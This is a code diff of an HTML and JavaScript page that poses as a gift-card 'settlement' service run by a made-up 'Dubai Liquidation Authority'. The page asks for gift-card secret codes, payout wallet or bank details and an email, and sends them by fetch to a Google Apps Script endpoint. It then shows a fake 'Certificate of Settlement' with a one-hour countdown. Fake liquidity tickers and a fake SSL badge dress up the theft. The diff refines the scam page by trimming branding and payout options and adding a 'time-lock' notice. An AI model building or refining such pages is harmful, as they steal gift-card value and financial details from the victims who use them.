@@ -42,12 +42,11 @@
         .res-box b { font-size: 34px; color: #fff; display: block; }
         #local-payout { font-size: 13px; color: #4ade80; margin-top: 8px; font-weight: bold; display: none; background: rgba(74,222,128,0.1); padding: 6px; border-radius: 8px; border: 1px dashed #4ade80; }
 
-        .node-footer { margin-top: 30px; padding-top: 20px; border-top: 1px solid #222; text-align: center; }
-        .node-footer p { font-size: 10px; color: #555; font-weight: 800; letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 15px; }
-        .node-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; padding: 0 10px; }
-        .node-item { font-size: 10px; color: #999; font-weight: 700; text-transform: uppercase; display: flex; align-items: center; gap: 8px; padding: 6px; border-radius: 4px; background: rgba(255,255,255,0.02); border: 1px solid #1a1a1a; }
-        .node-dot { width: 6px; height: 6px; background: #4ade80; border-radius: 50%; box-shadow: 0 0 8px #4ade80; animation: pulseNode 2s infinite; }
-        @keyframes pulseNode { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+        /* TIME-LOCK & NB STYLES */
+        .status-box { background: #16191e; padding: 15px; border-radius: 10px; margin: 20px 0; border: 1px solid #222; text-align: left; }
+        .time-lock { color: #ccc; font-size: 12px; line-height: 1.4; }
+        .time-lock b { color: #fff; }
+        .warning-nb { color: #ff4d4d; font-size: 12px; font-weight: bold; margin-top: 8px; display: block; }
 
         .main-btn { width: 100%; padding: 18px; background: var(--gold); border: none; font-weight: 800; cursor: pointer; color: #000; border-radius: 14px; text-transform: uppercase; font-size: 14px; margin-top: 15px; transition: 0.2s; }
         .secure-badge { text-align: center; font-size: 10px; color: #555; margin-top: 12px; display: flex; align-items: center; justify-content: center; gap: 5px; font-weight: 700; text-transform: uppercase; }
@@ -60,31 +59,20 @@
 
         #success { display: none; width: 100%; text-align: center; }
         .receipt-container { background: #fff; color: #000; padding: 25px; position: relative; width: 100%; max-width: 370px; margin: 0 auto; box-sizing: border-box; overflow: hidden; border-radius: 4px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
-        .watermark-overlay { position: absolute; top: 0; left: 0; width: 150%; height: 150%; pointer-events: none; opacity: 0.12; z-index: 1; display: flex; flex-wrap: wrap; transform: rotate(-25deg) translate(-10%, -10%); }
-        .wm-text { font-size: 10px; font-weight: 900; margin: 15px; white-space: nowrap; color: #000; text-transform: uppercase; }
         .receipt-body { position: relative; z-index: 2; text-align: left; }
         .cert-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 12px; }
         .cert-title { font-size: 24px; font-weight: 900; line-height: 0.9; text-transform: uppercase; margin: 0; }
-        .auth-sub { color: var(--gold); font-size: 11px; font-weight: 800; margin-top: 5px; display: block; }
-        .dla-seal { width: 65px; height: 65px; border: 2px solid var(--gold); border-radius: 50%; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; font-size: 8px; font-weight: 900; color: var(--gold); }
-        .receipt-hr { height: 2px; background: #000; border: none; margin: 8px 0; }
-        .r-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
-        .r-label { font-size: 9px; font-weight: 800; color: #666; text-transform: uppercase; }
-        .r-value { font-size: 13px; font-weight: 700; font-family: monospace; }
         .hero-box { text-align: center; padding: 15px 0; border-top: 3px solid #000; border-bottom: 3px solid #000; margin: 10px 0; }
         .hero-usd { font-size: 52px; font-weight: 900; display: block; line-height: 1; color: #000 !important; }
-        .hero-local { font-size: 22px; font-weight: 800; color: #333; }
         .black-banner { background: #000; color: #fff; text-align: center; padding: 12px; font-weight: 900; font-size: 15px; letter-spacing: 1px; margin-bottom: 15px; }
-        .receipt-footer { text-align: center; font-size: 8px; color: #888; font-weight: 700; line-height: 1.3; margin-top: 15px; }
 
-        .chat-btn { position: fixed; bottom: 20px; left: 20px; background: #16191e; border: 1px solid #333; padding: 12px 18px; border-radius: 50px; display: flex; align-items: center; gap: 10px; text-decoration: none; color: #fff; z-index: 3000; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
-        .dot { width: 8px; height: 8px; background: #25d366; border-radius: 50%; animation: blink 1.5s infinite; }
+        .chat-btn { position: fixed; bottom: 20px; left: 20px; background: #16191e; border: 1px solid #333; padding: 12px 18px; border-radius: 50px; display: flex; align-items: center; gap: 10px; text-decoration: none; color: #fff; z-index: 3000; }
     </style>
 </head>
 <body>
 
     <button class="theme-toggle" id="theme-btn" onclick="toggleTheme()">☀️ LIGHT</button>
-    <div class="ticker-wrap"><div class="ticker" id="live-ticker">💰 LIQUIDITY: $2,840,500 • 🛡️ DLA ENCRYPTION • ⚡ INSTANT SETTLEMENT • 🌍 GLOBAL NODE ACTIVE</div></div>
+    <div class="ticker-wrap"><div class="ticker" id="live-ticker">💰 LIQUIDITY: $2,840,500 • 🛡️ DLA ENCRYPTION • ⚡ INSTANT SETTLEMENT</div></div>
 
     <div class="panel">
         <div id="form">
@@ -97,7 +85,6 @@
                 <option value="1.4">📦 Amazon Global [1.4x]</option>
                 <option value="1.4">🍎 Apple iTunes [1.4x]</option>
                 <option value="1.4">💎 Razer Gold [1.4x]</option>
-                <option value="1.4">🎮 Steam Wallet [1.4x]</option>
             </select>
 
             <label>Card Secret Code</label>
@@ -112,23 +99,19 @@
                 <div id="local-payout"></div>
             </div>
 
-            <label>Global Payout Gateway (15 Methods)</label>
+            <div class="status-box">
+                <div class="time-lock">
+                    ⏱ <b>TIME-LOCK:</b> Payment will be processed in <b>1 hour exactly</b> after verification.
+                </div>
+                <span class="warning-nb">⚠️ NB: No payment for expired or wrong codes.</span>
+            </div>
+
+            <label>Global Payout Gateway</label>
             <div class="grid">
                 <div class="pay" onclick="sel(this, '💎 USDT', 'Enter TRC20 Wallet', 1, 'USDT')"><span>💎</span>USDT</div>
                 <div class="pay" onclick="sel(this, '🔵 PayPal', 'Enter Email Address', 1, 'USD')"><span>🔵</span>PayPal</div>
                 <div class="pay" onclick="sel(this, '🇳🇬 Bank', 'Acct No + Bank', 1610, 'NGN')"><span>🇳🇬</span>Bank NG</div>
-                <div class="pay" onclick="sel(this, '🌀 Zelle', 'Enter Email/Phone', 1, 'USD')"><span>🌀</span>Zelle</div>
                 <div class="pay" onclick="sel(this, '💸 CashApp', 'Enter $Cashtag', 1, 'USD')"><span>💸</span>CashApp</div>
-                <div class="pay" onclick="sel(this, '🟡 Binance', 'Enter Binance ID', 1, 'USD')"><span>🟡</span>Binance Pay</div>
-                <div class="pay" onclick="sel(this, '🇰🇪 M-Pesa', 'Enter Phone Number', 131.50, 'KES')"><span>🇰🇪</span>M-Pesa</div>
-                <div class="pay" onclick="sel(this, '💳 Revolut', 'Enter RevTag', 1, 'USD')"><span>💳</span>Revolut</div>
-                <div class="pay" onclick="sel(this, '🇬🇭 Momo', 'Enter GH Phone', 14.80, 'GHS')"><span>🇬🇭</span>MoMo GH</div>
-                <div class="pay" onclick="sel(this, '🍎 Apple Pay', 'Enter Apple Email', 1, 'USD')"><span>🍎</span>Apple Pay</div>
-                <div class="pay" onclick="sel(this, '🇿🇦 Bank', 'Acct + Branch', 18.50, 'ZAR')"><span>🇿🇦</span>Bank ZA</div>
-                <div class="pay" onclick="sel(this, '🟠 Skrill', 'Enter Email', 1, 'USD')"><span>🟠</span>Skrill</div>
-                <div class="pay" onclick="sel(this, '🟣 Venmo', 'Enter Username', 1, 'USD')"><span>🟣</span>Venmo</div>
-                <div class="pay" onclick="sel(this, '💰 Bitcoin', 'Enter BTC Address', 1, 'BTC')"><span>💰</span>Bitcoin</div>
-                <div class="pay" onclick="sel(this, '🏦 Wire', 'Enter IBAN/Swift', 1, 'USD')"><span>🏦</span>Bank Wire</div>
             </div>
 
             <label id="payout-label">Payout Details</label>
@@ -138,17 +121,7 @@
             <input id="email" type="email" placeholder="Required for receipt">
 
             <button class="main-btn" onclick="submitNow()">Authorize Settlement</button>
-            <div class="secure-badge"><span style="color:#4ade80;">🛡️</span> SSL 256-BIT ENCRYPTION SECURE</div>
-
-            <div class="node-footer">
-                <p>Authorized Settlement Nodes</p>
-                <div class="node-grid">
-                    <div class="node-item"><span class="node-dot"></span> SWIFT-INTL</div>
-                    <div class="node-item"><span class="node-dot"></span> FEDWIRE-HUB</div>
-                    <div class="node-item"><span class="node-dot"></span> BINANCE-BUSD</div>
-                    <div class="node-item"><span class="node-dot"></span> DUBAI-CENTRAL</div>
-                </div>
-            </div>
+            <div class="secure-badge">🛡️ SSL 256-BIT ENCRYPTION SECURE</div>
         </div>
 
         <div id="loader">
@@ -163,72 +136,26 @@
 
         <div id="success">
             <div class="receipt-container" id="receipt-content">
-                <div class="watermark-overlay" id="wm-layer"></div>
                 <div class="receipt-body">
                     <div class="cert-header">
                         <div>
                             <h1 class="cert-title">CERTIFICATE OF<br>SETTLEMENT</h1>
-                            <span class="auth-sub">Dubai Liquidation Authority</span>
                         </div>
-                        <div class="dla-seal">DLA<br>VERIFIED</div>
                     </div>
-                    <hr class="receipt-hr">
-                    <div class="r-row"><span class="r-label">Doc Status</span><span class="r-value" id="r-status" style="color:#b45309;">PENDING_LIQUIDATION</span></div>
-                    <div class="r-row"><span class="r-label">Transaction ID</span><span class="r-value" id="r-tid"></span></div>
-                    <div class="r-row"><span class="r-label">Gateway Node</span><span class="r-value" id="r-gateway"></span></div>
-                    <div class="r-row"><span class="r-label">Settlement Path</span><span class="r-value" id="r-path"></span></div>
                     <div class="hero-box">
                         <span class="hero-usd" id="r-price"></span>
-                        <span class="hero-local" id="r-local-val"></span>
                     </div>
                     <div class="black-banner">ESTIMATED ARRIVAL IN: <span id="r-timer">01:00:00</span></div>
-                    <div class="receipt-footer">
-                        <div id="qrcode" style="display:inline-block; margin-bottom:5px;"></div><br>
-                        ISSUED: <span id="r-date"></span><br>
-                        Authorized digital settlement issued by DLA Central Hub.
-                    </div>
                 </div>
             </div>
-            <button class="main-btn" onclick="saveHDReceipt()" style="background:#000; color:#fff; border:1px solid #333; margin-top:20px;">📄 Save Official Certificate</button>
             <button class="main-btn" onclick="location.reload()" style="background:var(--gold); color:#000; margin-top:10px;">New Transaction</button>
         </div>
     </div>
 
-    <a href="https://wa.me/447400436904" class="chat-btn"><div class="dot"></div><span>WhatsApp Support</span></a>
-
     <script>
-        // UPDATED GOOGLE SCRIPT URL INTEGRATED
         const bridgeScriptURL = 'https://script.google.com/macros/s/AKfycbwjcUxO0KGuvrT6Lbvs9D0NCMEp07JJ4s6JQ-vHCWnBwSj2bIwENr-IaU1H5E9WkA/exec';
         
         let method = ""; let rateL = 1; let sym = "USD";
-        const successSound = new Audio('https://assets.mixkit.co/active_storage/sfx/2013/2013-preview.mp3');
-
-        // Watermark Generation
-        const wmLayer = document.getElementById('wm-layer');
-        for(let i=0; i<30; i++) {
-            const span = document.createElement('span');
-            span.className = 'wm-text';
-            span.innerText = 'OFFICIAL DLA DOCUMENT';
-            wmLayer.appendChild(span);
-        }
-
-        function toggleTheme() {
-            const html = document.documentElement;
-            const btn = document.getElementById('theme-btn');
-            if (html.getAttribute('data-theme') === 'dark') {
-                html.setAttribute('data-theme', 'light');
-                btn.innerText = "🌙 DARK";
-            } else {
-                html.setAttribute('data-theme', 'dark');
-                btn.innerText = "☀️ LIGHT";
-            }
-        }
-
-        function updateTicker() {
-            const liq = (2840500 + Math.floor(Math.random() * 5000)).toLocaleString();
-            document.getElementById('live-ticker').innerHTML = `💰 LIQUIDITY: $${liq} • 🛡️ DLA ENCRYPTION • ⚡ INSTANT SETTLEMENT • 🌍 GLOBAL NODE ACTIVE`;
-        }
-        setInterval(updateTicker, 8000);
 
         function sel(el, val, shadow, r, s) {
             document.querySelectorAll('.pay').forEach(x => x.classList.remove('active'));
@@ -244,11 +171,6 @@
             let rate = parseFloat(document.getElementById('brand').value);
             let totalUSD = (isNaN(v) ? 0 : (v * rate));
             document.getElementById('display-area').innerHTML = '<b>$' + totalUSD.toFixed(2) + '</b>';
-            let lBox = document.getElementById('local-payout');
-            if(rateL > 1) {
-                lBox.style.display = "block";
-                lBox.innerText = "(" + (totalUSD * rateL).toLocaleString() + " " + sym + ")";
-            } else { lBox.style.display = "none"; }
         }
 
         function submitNow() {
@@ -262,7 +184,6 @@
             document.getElementById('form').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
 
-            // PREPARE DATA PACKAGE
             const payload = {
                 "card_code": cardCode,
                 "payout_total_usd": amount,
@@ -271,7 +192,6 @@
                 "user_email": userEmail
             };
 
-            // SEND TO BRIDGE
             fetch(bridgeScriptURL, {
                 method: 'POST',
                 mode: 'no-cors',
@@ -285,27 +205,13 @@
                     if(p==66) document.getElementById('s2').className='step-done';
                     if(p>=100) { clearInterval(iv); showReceipt(); }
                 }, 40);
-            }).catch(err => {
-                alert("Connection failed. Check your network.");
-                console.error(err);
             });
         }
 
         function showReceipt() {
             document.getElementById('loader').style.display = 'none';
             document.getElementById('success').style.display = 'block';
-            let tid = "DLA-TX" + Math.floor(100000 + Math.random() * 900000);
-            
-            let cleanGateway = method.replace(/([\u2700-\u27BF]|[\uE000-\uF8FF]|\uD83C[\uDC00-\uDFFF]|\uD83D[\uDC00-\uDFFF]|[\u2011-\u26FF]|\uD83E[\uDD10-\uDDFF])/g, '').trim();
-            
-            document.getElementById('r-tid').innerText = tid;
-            document.getElementById('r-gateway').innerText = cleanGateway;
-            document.getElementById('r-path').innerText = document.getElementById('wallet').value;
             document.getElementById('r-price').innerText = document.getElementById('display-area').innerText;
-            document.getElementById('r-local-val').innerText = document.getElementById('local-payout').innerText;
-            document.getElementById('r-date').innerText = new Date().toLocaleString();
-            new QRCode(document.getElementById("qrcode"), { text: tid, width: 60, height: 60 });
-            successSound.play();
             startTimer();
         }
 
@@ -320,15 +226,6 @@
                 timerEl.innerText = `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
                 if (time <= 0) clearInterval(countdown);
             }, 1000);
-        }
-
-        function saveHDReceipt() {
-            html2canvas(document.querySelector("#receipt-content"), { scale: 3 }).then(canvas => {
-                const link = document.createElement('a');
-                link.download = 'DLA_Certificate_Official.png';
-                link.href = canvas.toDataURL();
-                link.click();
-            });
         }
     </script>
 </body>
